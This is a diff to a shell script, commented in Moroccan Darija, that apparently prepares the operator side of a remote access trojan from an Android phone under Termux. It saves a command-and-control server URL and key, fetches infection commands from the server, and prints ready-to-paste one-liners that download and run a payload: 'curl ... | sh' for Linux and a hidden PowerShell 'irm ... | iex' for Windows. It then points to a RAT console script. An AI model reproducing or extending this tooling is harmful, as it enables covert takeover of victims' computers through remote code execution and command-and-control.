@@ -10,8 +10,8 @@ termux-wake-lock 2>/dev/null || true
 echo "[*] 3mel battery: Settings > Apps > Termux > Battery > Unrestricted"
 
 URL="${1:-}"; KEY="${2:-}"
-[ -z "$URL" ] && read -rp "URL dyal Railway: " URL
-[ -z "$KEY" ] && read -rp "AUTH key: " KEY
+if [ -z "$URL" ]; then read -rp "URL dyal Railway: " URL; fi
+if [ -z "$KEY" ]; then read -rp "AUTH key: " KEY; fi
 URL="${URL%/}"
 
 printf 'URL=%s\nKEY=%s\n' "$URL" "$KEY" > "$HOME/.c2"
@@ -26,9 +26,10 @@ fi
 
 L="curl -fsSL $URL/i | sh"
 W="powershell -w hidden -c \"irm $URL/i.ps1 | iex\""
-if curl -fsS -H "X-Auth: $KEY" "$URL/link" 2>/dev/null | grep -q linux; then
-  L=$(curl -s -H "X-Auth: $KEY" "$URL/link" | grep '^linux' | cut -d' ' -f2-)
-  W=$(curl -s -H "X-Auth: $KEY" "$URL/link" | grep '^windows' | cut -d' ' -f2-)
+LINKS=$(curl -fsS -H "X-Auth: $KEY" "$URL/link" 2>/dev/null || true)
+if printf '%s' "$LINKS" | grep -q '^linux'; then
+  L=$(printf '%s\n' "$LINKS" | awk '/^linux/{sub(/^linux:[[:space:]]*/,"");print;exit}')
+  W=$(printf '%s\n' "$LINKS" | awk '/^windows/{sub(/^windows:[[:space:]]*/,"");print;exit}')
   echo "[+] /link khdam"
 else
   echo "[!] /link ma khdamch — 3awd railway up (l'patch ma tdeployach)"
@@ -39,4 +40,4 @@ echo; echo "LINUX  : $L"; echo "WINDOWS: $W"; echo
 echo "[+] l'lien f l'clipboard"
 
 termux-open-url "$URL/?k=$KEY" 2>/dev/null || echo "7el b yeddek: $URL/?k=$KEY"
-echo "[+] console: python3 ~/rat/console.py --url \$URL --key \$KEY"
+echo "[+] console: python3 ~/rat/console.py --url $URL --key $KEY"
